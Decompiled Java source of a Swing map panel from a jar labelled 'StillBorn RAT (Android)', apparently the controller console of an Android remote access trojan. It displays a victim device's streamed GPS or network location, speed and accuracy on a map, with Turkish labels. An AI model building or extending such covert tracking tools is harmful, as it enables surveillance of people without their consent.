/*   1:    */ package gui.panel;
/*   2:    */ 
/*   3:    */ import gui.UserGUI;
/*   4:    */ import java.awt.event.ActionEvent;
/*   5:    */ import java.awt.event.ActionListener;
/*   6:    */ import java.util.ArrayList;
/*   7:    */ import java.util.Date;
/*   8:    */ import java.util.List;
/*   9:    */ import javax.swing.ButtonGroup;
/*  10:    */ import javax.swing.GroupLayout;
/*  11:    */ import javax.swing.GroupLayout.Alignment;
/*  12:    */ import javax.swing.GroupLayout.ParallelGroup;
/*  13:    */ import javax.swing.GroupLayout.SequentialGroup;
/*  14:    */ import javax.swing.JButton;
/*  15:    */ import javax.swing.JLabel;
/*  16:    */ import javax.swing.JPanel;
/*  17:    */ import javax.swing.JRadioButton;
/*  18:    */ import javax.swing.JSplitPane;
/*  19:    */ import javax.swing.LayoutStyle.ComponentPlacement;
/*  20:    */ import javax.swing.border.TitledBorder;
/*  21:    */ import org.openstreetmap.gui.jmapviewer.JMapViewer;
/*  22:    */ import org.openstreetmap.gui.jmapviewer.MapMarkerDot;
/*  23:    */ import org.openstreetmap.gui.jmapviewer.interfaces.MapMarker;
/*  24:    */ 
/*  25:    */ public class MapPanel
/*  26:    */   extends JPanel
/*  27:    */ {
/*  28: 50 */   private boolean streaming = false;
/*  29:    */   private JButton btnStopStreaming;
/*  30:    */   private UserGUI gui;
/*  31:    */   private JRadioButton rdbtnNetwork;
/*  32:    */   private JRadioButton rdbtnGps;
/*  33:    */   private JLabel lblVallongitude;
/*  34:    */   private JLabel lblVallatitude;
/*  35:    */   private JLabel lblValaltitude;
/*  36:    */   private JLabel lblValvitesse;
/*  37:    */   private JLabel lblValprecision;
/*  38:    */   private JLabel lblVallastdata;
/*  39:    */   private JMapViewer mapViewer;
/*  40:    */   private double lastLongitude;
/*  41:    */   private double lastLatitude;
/*  42: 66 */   private final ButtonGroup buttonGroup = new ButtonGroup();
/*  43:    */   
/*  44:    */   public MapPanel(UserGUI gui)
/*  45:    */   {
/*  46: 73 */     this.gui = gui;
/*  47: 74 */     this.streaming = false;
/*  48:    */     
/*  49: 76 */     JSplitPane splitPane = new JSplitPane();
/*  50: 77 */     GroupLayout groupLayout = new GroupLayout(this);
/*  51: 78 */     groupLayout.setHorizontalGroup(
/*  52: 79 */       groupLayout.createParallelGroup(GroupLayout.Alignment.TRAILING)
/*  53: 80 */       .addGroup(GroupLayout.Alignment.LEADING, groupLayout.createSequentialGroup()
/*  54: 81 */       .addContainerGap()
/*  55: 82 */       .addComponent(splitPane, -1, 624, 32767)
/*  56: 83 */       .addContainerGap()));
/*  57:    */     
/*  58: 85 */     groupLayout.setVerticalGroup(
/*  59: 86 */       groupLayout.createParallelGroup(GroupLayout.Alignment.TRAILING)
/*  60: 87 */       .addGroup(GroupLayout.Alignment.LEADING, groupLayout.createSequentialGroup()
/*  61: 88 */       .addContainerGap()
/*  62: 89 */       .addComponent(splitPane, -2, 545, 32767)
/*  63: 90 */       .addContainerGap()));
/*  64:    */     
/*  65:    */ 
/*  66: 93 */     this.mapViewer = new JMapViewer();
/*  67: 94 */     splitPane.setLeftComponent(this.mapViewer);
/*  68:    */     
/*  69: 96 */     JPanel panel = new JPanel();
/*  70: 97 */     splitPane.setRightComponent(panel);
/*  71:    */     
/*  72: 99 */     JPanel panel_1 = new JPanel();
/*  73:100 */     panel_1.setBorder(new TitledBorder(null, "Bilgiler", 4, 2, null, null));
/*  74:    */     
/*  75:102 */     JButton btnCenterView = new JButton("Ortala");
/*  76:103 */     btnCenterView.addActionListener(new ActionListener()
/*  77:    */     {
/*  78:    */       public void actionPerformed(ActionEvent e)
/*  79:    */       {
/*  80:105 */         MapPanel.this.centerMapView();
/*  81:    */       }
/*  82:108 */     });
/*  83:109 */     JPanel panel_2 = new JPanel();
/*  84:110 */     panel_2.setBorder(new TitledBorder(null, "Başlangıç grubu", 4, 2, null, null));
/*  85:111 */     GroupLayout gl_panel = new GroupLayout(panel);
/*  86:112 */     gl_panel.setHorizontalGroup(
/*  87:113 */       gl_panel.createParallelGroup(GroupLayout.Alignment.TRAILING)
/*  88:114 */       .addGroup(GroupLayout.Alignment.LEADING, gl_panel.createSequentialGroup()
/*  89:115 */       .addContainerGap()
/*  90:116 */       .addGroup(gl_panel.createParallelGroup(GroupLayout.Alignment.LEADING)
/*  91:117 */       .addComponent(panel_1, GroupLayout.Alignment.TRAILING, -1, 197, 32767)
/*  92:118 */       .addComponent(panel_2, GroupLayout.Alignment.TRAILING, -1, 197, 32767)
/*  93:119 */       .addComponent(btnCenterView, GroupLayout.Alignment.TRAILING, -1, 197, 32767))
/*  94:120 */       .addContainerGap()));
/*  95:    */     
/*  96:122 */     gl_panel.setVerticalGroup(
/*  97:123 */       gl_panel.createParallelGroup(GroupLayout.Alignment.LEADING)
/*  98:124 */       .addGroup(GroupLayout.Alignment.TRAILING, gl_panel.createSequentialGroup()
/*  99:125 */       .addContainerGap()
/* 100:126 */       .addComponent(panel_1, -1, 238, 32767)
/* 101:127 */       .addPreferredGap(LayoutStyle.ComponentPlacement.RELATED)
/* 102:128 */       .addComponent(panel_2, -2, 151, -2)
/* 103:129 */       .addPreferredGap(LayoutStyle.ComponentPlacement.RELATED)
/* 104:130 */       .addComponent(btnCenterView)
/* 105:131 */       .addGap(161)));
/* 106:    */     
/* 107:    */ 
/* 108:134 */     JLabel lblProvider = new JLabel("Konum sağlayıcı :");
/* 109:    */     
/* 110:136 */     this.rdbtnNetwork = new JRadioButton("İnternet");
/* 111:137 */     this.rdbtnNetwork.setSelected(true);
/* 112:138 */     this.buttonGroup.add(this.rdbtnNetwork);
/* 113:    */     
/* 114:140 */     this.rdbtnGps = new JRadioButton("GPS");
/* 115:141 */     this.buttonGroup.add(this.rdbtnGps);
/* 116:    */     
/* 117:143 */     this.btnStopStreaming = new JButton("Yayını başlat");
/* 118:144 */     this.btnStopStreaming.addActionListener(new ActionListener()
/* 119:    */     {
/* 120:    */       public void actionPerformed(ActionEvent e)
/* 121:    */       {
/* 122:146 */         MapPanel.this.fireButtonStreaming();
/* 123:    */       }
/* 124:148 */     });
/* 125:149 */     GroupLayout gl_panel_2 = new GroupLayout(panel_2);
/* 126:150 */     gl_panel_2.setHorizontalGroup(
/* 127:151 */       gl_panel_2.createParallelGroup(GroupLayout.Alignment.LEADING)
/* 128:152 */       .addGroup(gl_panel_2.createSequentialGroup()
/* 129:153 */       .addContainerGap()
/* 130:154 */       .addGroup(gl_panel_2.createParallelGroup(GroupLayout.Alignment.LEADING)
/* 131:155 */       .addComponent(this.btnStopStreaming, -1, 147, 32767)
/* 132:156 */       .addComponent(this.rdbtnGps)
/* 133:157 */       .addGroup(gl_panel_2.createSequentialGroup()
/* 134:158 */       .addComponent(lblProvider)
/* 135:159 */       .addGap(18))
/* 136:160 */       .addComponent(this.rdbtnNetwork))
/* 137:161 */       .addContainerGap()));
/* 138:    */     
/* 139:163 */     gl_panel_2.setVerticalGroup(
/* 140:164 */       gl_panel_2.createParallelGroup(GroupLayout.Alignment.LEADING)
/* 141:165 */       .addGroup(gl_panel_2.createSequentialGroup()
/* 142:166 */       .addContainerGap()
/* 143:167 */       .addComponent(lblProvider)
/* 144:168 */       .addPreferredGap(LayoutStyle.ComponentPlacement.UNRELATED)
/* 145:169 */       .addComponent(this.rdbtnNetwork)
/* 146:170 */       .addPreferredGap(LayoutStyle.ComponentPlacement.RELATED)
/* 147:171 */       .addComponent(this.rdbtnGps)
/* 148:172 */       .addGap(18)
/* 149:173 */       .addComponent(this.btnStopStreaming)
/* 150:174 */       .addContainerGap(-1, 32767)));
/* 151:    */     
/* 152:176 */     panel_2.setLayout(gl_panel_2);
/* 153:    */     
/* 154:178 */     JLabel lblLongitude = new JLabel("Boylam :");
/* 155:    */     
/* 156:180 */     this.lblVallongitude = new JLabel("val_longitude");
/* 157:    */     
/* 158:182 */     JLabel lblLatitude = new JLabel("Enlem :");
/* 159:    */     
/* 160:184 */     this.lblVallatitude = new JLabel("val_latitude");
/* 161:    */     
/* 162:186 */     JLabel lblAltitude = new JLabel("Rakım :");
/* 163:    */     
/* 164:188 */     this.lblValaltitude = new JLabel("val_altitude");
/* 165:    */     
/* 166:190 */     JLabel lblVitesse = new JLabel("Hız :");
/* 167:    */     
/* 168:192 */     this.lblValvitesse = new JLabel("val_vitesse");
/* 169:    */     
/* 170:194 */     JLabel lblPrcision = new JLabel("Doğruluk :");
/* 171:    */     
/* 172:196 */     this.lblValprecision = new JLabel("val_precision");
/* 173:    */     
/* 174:198 */     JLabel lblLastData = new JLabel("Alınan son data :");
/* 175:    */     
/* 176:200 */     this.lblVallastdata = new JLabel("val_last_data");
/* 177:201 */     GroupLayout gl_panel_1 = new GroupLayout(panel_1);
/* 178:202 */     gl_panel_1.setHorizontalGroup(
/* 179:203 */       gl_panel_1.createParallelGroup(GroupLayout.Alignment.LEADING)
/* 180:204 */       .addGroup(gl_panel_1.createSequentialGroup()
/* 181:205 */       .addContainerGap()
/* 182:206 */       .addGroup(gl_panel_1.createParallelGroup(GroupLayout.Alignment.LEADING)
/* 183:207 */       .addGroup(gl_panel_1.createSequentialGroup()
/* 184:208 */       .addComponent(lblLongitude)
/* 185:209 */       .addPreferredGap(LayoutStyle.ComponentPlacement.RELATED)
/* 186:210 */       .addComponent(this.lblVallongitude))
/* 187:211 */       .addGroup(gl_panel_1.createSequentialGroup()
/* 188:212 */       .addComponent(lblLatitude)
/* 189:213 */       .addGap(6)
/* 190:214 */       .addComponent(this.lblVallatitude))
/* 191:215 */       .addGroup(gl_panel_1.createSequentialGroup()
/* 192:216 */       .addComponent(lblAltitude)
/* 193:217 */       .addPreferredGap(LayoutStyle.ComponentPlacement.RELATED)
/* 194:218 */       .addComponent(this.lblValaltitude))
/* 195:219 */       .addGroup(gl_panel_1.createSequentialGroup()
/* 196:220 */       .addComponent(lblVitesse)
/* 197:221 */       .addGap(6)
/* 198:222 */       .addComponent(this.lblValvitesse))
/* 199:223 */       .addGroup(gl_panel_1.createSequentialGroup()
/* 200:224 */       .addComponent(lblPrcision)
/* 201:225 */       .addGap(6)
/* 202:226 */       .addComponent(this.lblValprecision))
/* 203:227 */       .addComponent(lblLastData)
/* 204:228 */       .addComponent(this.lblVallastdata))
/* 205:229 */       .addContainerGap(195, 32767)));
/* 206:    */     
/* 207:231 */     gl_panel_1.setVerticalGroup(
/* 208:232 */       gl_panel_1.createParallelGroup(GroupLayout.Alignment.LEADING)
/* 209:233 */       .addGroup(gl_panel_1.createSequentialGroup()
/* 210:234 */       .addContainerGap()
/* 211:235 */       .addGroup(gl_panel_1.createParallelGroup(GroupLayout.Alignment.BASELINE)
/* 212:236 */       .addComponent(lblLongitude)
/* 213:237 */       .addComponent(this.lblVallongitude))
/* 214:238 */       .addPreferredGap(LayoutStyle.ComponentPlacement.RELATED)
/* 215:239 */       .addGroup(gl_panel_1.createParallelGroup(GroupLayout.Alignment.LEADING)
/* 216:240 */       .addComponent(lblLatitude)
/* 217:241 */       .addComponent(this.lblVallatitude))
/* 218:242 */       .addPreferredGap(LayoutStyle.ComponentPlacement.RELATED)
/* 219:243 */       .addGroup(gl_panel_1.createParallelGroup(GroupLayout.Alignment.BASELINE)
/* 220:244 */       .addComponent(lblAltitude)
/* 221:245 */       .addComponent(this.lblValaltitude))
/* 222:246 */       .addPreferredGap(LayoutStyle.ComponentPlacement.RELATED)
/* 223:247 */       .addGroup(gl_panel_1.createParallelGroup(GroupLayout.Alignment.LEADING)
/* 224:248 */       .addComponent(lblVitesse)
/* 225:249 */       .addComponent(this.lblValvitesse))
/* 226:250 */       .addPreferredGap(LayoutStyle.ComponentPlacement.RELATED)
/* 227:251 */       .addGroup(gl_panel_1.createParallelGroup(GroupLayout.Alignment.LEADING)
/* 228:252 */       .addComponent(lblPrcision)
/* 229:253 */       .addComponent(this.lblValprecision))
/* 230:254 */       .addGap(18)
/* 231:255 */       .addComponent(lblLastData)
/* 232:256 */       .addPreferredGap(LayoutStyle.ComponentPlacement.RELATED)
/* 233:257 */       .addComponent(this.lblVallastdata)
/* 234:258 */       .addContainerGap(58, 32767)));
/* 235:    */     
/* 236:260 */     panel_1.setLayout(gl_panel_1);
/* 237:261 */     panel.setLayout(gl_panel);
/* 238:262 */     setLayout(groupLayout);
/* 239:    */   }
/* 240:    */   
/* 241:    */   private void centerMapView()
/* 242:    */   {
/* 243:267 */     this.mapViewer.setDisplayPositionByLatLon(this.lastLatitude, this.lastLongitude, this.mapViewer.getZoom());
/* 244:    */   }
/* 245:    */   
/* 246:    */   private void fireButtonStreaming()
/* 247:    */   {
/* 248:271 */     if (this.streaming)
/* 249:    */     {
/* 250:272 */       this.btnStopStreaming.setText("Yayını başlat");
/* 251:273 */       this.streaming = false;
/* 252:274 */       this.gui.fireStopGPSStreaming();
/* 253:    */     }
/* 254:    */     else
/* 255:    */     {
/* 256:276 */       String provider = null;
/* 257:277 */       if (this.rdbtnNetwork.isSelected()) {
/* 258:277 */         provider = "network";
/* 259:278 */       } else if (this.rdbtnGps.isSelected()) {
/* 260:278 */         provider = "gps";
/* 261:    */       }
/* 262:279 */       this.btnStopStreaming.setText("Yayını durdur");
/* 263:280 */       this.streaming = true;
/* 264:281 */       this.gui.fireStartGPSStreaming(provider);
/* 265:    */     }
/* 266:    */   }
/* 267:    */   
/* 268:    */   public void updateMap(double longitude, double latitude, double altitude, float speed, float accuracy)
/* 269:    */   {
/* 270:286 */     this.lastLatitude = latitude;
/* 271:287 */     this.lastLongitude = longitude;
/* 272:    */     
/* 273:289 */     MapMarkerDot marker = new MapMarkerDot(latitude, longitude);
/* 274:290 */     List<MapMarker> markerList = new ArrayList();
/* 275:291 */     markerList.add(marker);
/* 276:292 */     this.mapViewer.setMapMarkerList(markerList);
/* 277:293 */     this.mapViewer.setMapMarkerVisible(true);
/* 278:    */     
/* 279:295 */     this.lblVallongitude.setText(String.valueOf(longitude));
/* 280:296 */     this.lblVallatitude.setText(String.valueOf(latitude));
/* 281:297 */     this.lblValaltitude.setText(String.valueOf(altitude));
/* 282:298 */     this.lblValvitesse.setText(String.valueOf(speed));
/* 283:299 */     this.lblValprecision.setText(String.valueOf(accuracy));
/* 284:    */     
/* 285:301 */     Date date = new Date(System.currentTimeMillis());
/* 286:302 */     this.lblVallastdata.setText(date.toString());
/* 287:    */   }
/* 288:    */   
/* 289:    */   public boolean getStreaming()
/* 290:    */   {
/* 291:306 */     return this.streaming;
/* 292:    */   }
/* 293:    */ }


/* Location:           C:\Users\SmileyFacedHacker\Downloads\StillBorn RAT (Android)\StillBorn RAT (Android)\StillBornRAT.jar
 * Qualified Name:     gui.panel.MapPanel
 * JD-Core Version:    0.7.0.1
 */